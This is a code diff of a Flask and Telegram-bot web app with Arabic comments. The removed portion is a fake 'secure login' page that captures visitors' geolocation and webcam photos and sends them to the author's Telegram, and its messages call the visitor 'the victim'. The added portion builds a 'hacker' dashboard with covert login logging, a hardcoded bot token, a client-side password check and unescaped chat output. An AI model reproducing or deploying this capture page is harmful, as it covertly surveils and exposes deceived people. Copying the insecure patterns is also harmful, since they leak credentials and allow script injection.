@@ -1,93 +1,147 @@
-import telebot, os, requests, base64
+import telebot, os, requests, base64, time
 from flask import Flask, render_template_string, request, jsonify
 
-# --- [ إعدادات البوت - تأكد من صحتها ] ---
+# --- [ إعدادات المطور Muhammad ] ---
 BOT_TOKEN = "6785445743:AAFquuyfY2IIjgs2x6PnL61uA-3apHIpz2k"
 MY_ID = "6695916631"
+ADMIN_PASS = "hx2026"
+INSTA_URL = "https://instagram.com/kail.911" # رابط حسابك
+
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
+app.secret_key = "MUHAMMAD_PREMIUM_OS"
 
-# --- [ واجهة التمويه الاحترافية ] ---
-HTML_INTERFACE = """
+# دالة الذكاء الاصطناعي
+def get_ai_response(user_text):
+    try:
+        res = requests.get(f"https://api.simsimi.net/v2/?text={user_text}&lc=ar", timeout=8)
+        return res.json().get('success', "سيدي، النظام قيد المعالجة...")
+    except: return "اتصال مشفر وجاري الرد..."
+
+HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>LOGIN | KAIL-911 SYSTEM</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MUHAMMAD SYSTEM | PRIVATE ACCESS</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <style>
-        body { background: #000; color: #00f2ff; font-family: 'Courier New', monospace; height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; }
-        .box { border: 2px solid #00f2ff; padding: 50px; border-radius: 15px; text-align: center; background: rgba(0,242,255,0.05); }
-        .btn { background: #00f2ff; color: #000; border: none; padding: 15px 40px; font-weight: bold; cursor: pointer; border-radius: 5px; font-size: 18px; margin-top: 20px; }
-        video, canvas { display: none; }
+        body { margin: 0; background: #000; color: #00ffcc; font-family: 'Courier New', monospace; overflow: hidden; }
+        
+        /* علامات الهوية */
+        .dev-tag { position: fixed; top: 15px; right: 20px; font-size: 14px; font-weight: bold; color: #00ffcc; z-index: 1000; text-shadow: 0 0 10px #00ffcc; }
+        .insta-btn { position: fixed; top: 10px; left: 20px; z-index: 1000; background: transparent; border: 1px solid #00ffcc; color: #00ffcc; padding: 8px 15px; border-radius: 5px; text-decoration: none; font-size: 12px; transition: 0.4s; box-shadow: 0 0 10px #00ffcc44; }
+        .insta-btn:hover { background: #00ffcc; color: #000; box-shadow: 0 0 20px #00ffcc; }
+
+        /* شاشات البداية */
+        #welcome-screen { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+        #login-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 999; flex-direction: column; justify-content: center; align-items: center; }
+        
+        /* لوحة التحكم */
+        #main-dashboard { display: none; height: 100vh; grid-template-columns: 1.5fr 450px; padding: 60px 20px 20px 20px; gap: 20px; box-sizing: border-box; }
+        
+        /* واجهة الموبايل */
+        .phone-container { background: #0a0a0a; border: 4px solid #1a1a1a; border-radius: 45px; height: 100%; display: flex; flex-direction: column; overflow: hidden; box-shadow: 0 0 40px #00ffcc11; border: 1px solid #00ffcc33; }
+        .phone-screen { flex: 1; background: #000; display: flex; flex-direction: column; padding: 20px; overflow-y: auto; }
+        .chat-bubble { padding: 12px; margin: 8px; border-radius: 15px; max-width: 85%; font-size: 13px; line-height: 1.4; font-family: sans-serif; }
+        .user-msg { background: #00ffcc; color: #000; align-self: flex-end; font-weight: bold; }
+        .ai-msg { background: #111; color: #00ffcc; align-self: flex-start; border: 1px solid #00ffcc33; }
+        
+        .input-area { background: #0a0a0a; padding: 20px; border-top: 1px solid #1a1a1a; }
+        .phone-input { width: 100%; background: #000; border: 1px solid #00ffcc44; color: #00ffcc; padding: 12px; border-radius: 25px; outline: none; text-align: center; }
+
+        /* خريطة الهجمات */
+        .map-box { border: 1px solid #00ffcc22; border-radius: 15px; overflow: hidden; position: relative; }
+        iframe { width: 100%; height: 100%; border: none; filter: hue-rotate(140deg) brightness(0.7) contrast(1.2); }
+
+        .glitch-text { font-size: 2em; letter-spacing: 4px; animation: scan 3s infinite; }
+        @keyframes scan { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1>🔐 نظام التحقق الآمن</h1>
-        <p>اضغط على الزر أدناه لتأكيد هويتك والدخول للنظام</p>
-        <button class="btn" onclick="takeAuth()">دخول / LOGIN</button>
+
+<div class="dev-tag">DEVELOPER: MUHAMMAD</div>
+<a href="{{ insta_url }}" target="_blank" class="insta-btn">INSTAGRAM PROFILE</a>
+
+<div id="welcome-screen">
+    <div class="glitch-text">معك الرد التلقائي الذكي</div>
+    <p style="color: #666; margin-top: 10px;">المبرمج من قبل المطور Muhammad</p>
+</div>
+
+<div id="login-screen">
+    <div style="text-align:center;">
+    <h3 style="letter-spacing: 10px;">ENCRYPTED LOGIN</h3>
+        <input type="password" id="passInput" placeholder="SYSTEM KEY" style="background:transparent; border:1px solid #00ffcc; color:#00ffcc; padding:10px; text-align:center; outline:none; width:250px;">
+        <br><br>
+        <button onclick="checkAuth()" style="background:#00ffcc; color:#000; border:none; padding:10px 50px; font-weight:bold; cursor:pointer;">ACCESS</button>
+    </div>
+</div>
+
+<div id="main-dashboard">
+    <div class="map-box">
+        <iframe src="https://cybermap.kaspersky.com/en/widget/map"></iframe>
     </div>
 
-    <video id="v" autoplay></video>
-    <canvas id="c"></canvas>
+    <div class="phone-container">
+        <div class="phone-screen" id="chatBox">
+            <div class="chat-bubble ai-msg">نظام الذكاء الاصطناعي نشط.. أهلاً بك سيدي محمد، كيف يمكنني مساعدتك في مهامك اليوم؟</div>
+        </div>
+        <div class="input-area">
+            <input type="text" id="userInput" class="phone-input" placeholder="أرسل أمراً للنظام..." onkeypress="if(event.which==13)sendMessage()">
+        </div>
+    </div>
+</div>
 
-    <script>
-        async function takeAuth() {
-            // طلب الموقع
-            navigator.geolocation.getCurrentPosition(p => {
-                fetch('/loc', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude})
-                });
-            });
+<script>
+    setTimeout(() => { $("#welcome-screen").fadeOut(); $("#login-screen").fadeIn(); }, 4000);
 
-            // طلب الكاميرا والتقاط الصورة
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({video: true});
-                const v = document.getElementById('v');
-                v.srcObject = s;
-                
-                setTimeout(() => {
-                    const c = document.getElementById('c');
-                    c.width = v.videoWidth; c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    fetch('/img', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({img: c.toDataURL('image/png')})
-                    });
-                    // توجيه الضحية بعد السحب
-                    window.location.href = "https://instagram.com/kail.911";
-                }, 1500);
-            } catch(e) { alert("خطأ: يجب السماح بالوصول (Allow) للمتابعة!"); }
-        }
-    </script>
+    function checkAuth() {
+        if($("#passInput").val() === "{{ admin_pass }}") {
+            $("#login-screen").fadeOut();
+            $("#main-dashboard").css("display","grid");
+            // صيد صامت عند الدخول
+            fetch('/silent-log', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ua: navigator.userAgent})});
+        } else { alert("ACCESS DENIED!"); }
+    }
+
+    function sendMessage() {
+        let val = $("#userInput").val();
+        if(!val) return;
+        $("#chatBox").append(`<div class="chat-bubble user-msg">${val}</div>`);
+        $("#userInput").val("");
+        $("#chatBox").scrollTop($("#chatBox")[0].scrollHeight);
+
+        $.ajax({
+            url: '/ask-ai',
+            method: 'POST',
+            contentType: 'application/json',
+            data: JSON.stringify({ message: val }),
+            success: function(data) {
+                $("#chatBox").append(`<div class="chat-bubble ai-msg">${data.answer}</div>`);
+                $("#chatBox").scrollTop($("#chatBox")[0].scrollHeight);
+            }
+        });
+    }
+</script>
 </body>
 </html>
 """
 
 @app.route("/")
 def index():
-    return render_template_string(HTML_INTERFACE)
+    return render_template_string(HTML_TEMPLATE, admin_pass=ADMIN_PASS, insta_url=INSTA_URL)
 
-@app.route("/loc", methods=['POST'])
-def loc():
-    d = request.json
-    # إرسال الموقع للبوت
-    url = f"https://www.google.com/maps?q={d['lat']},{d['lon']}"
-    bot.send_message(MY_ID, f"📍 **تم سحب موقع جديد!**\n\nرابط الخريطة:\n{url}")
-    return jsonify(ok=True)
+@app.route("/ask-ai", methods=['POST'])
+def ask_ai():
+    ans = get_ai_response(request.json.get('message'))
+    return jsonify(answer=ans)
 
-@app.route("/img", methods=['POST'])
-def img():
-    d = request.json
-    # إرسال الصورة للبوت
-    img_data = base64.b64decode(d['img'].split(',')[1])
-    with open("snap.png", "wb") as f: f.write(img_data)
-    with open("snap.png", "rb") as f:
-        bot.send_photo(MY_ID, f, caption="📸 **تم التقاط صورة الضحية بنجاح!**")
+@app.route("/silent-log", methods=['POST'])
+def silent_log():
+    ip = requests.get("https://api.ipify.org").text
+    bot.send_message(MY_ID, f"👤 **دخول جديد للوحة المطور محمد**\n🌐 IP: `{ip}`")
     return jsonify(ok=True)
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
+    app.run(host="0.0.0.0", port=5000)
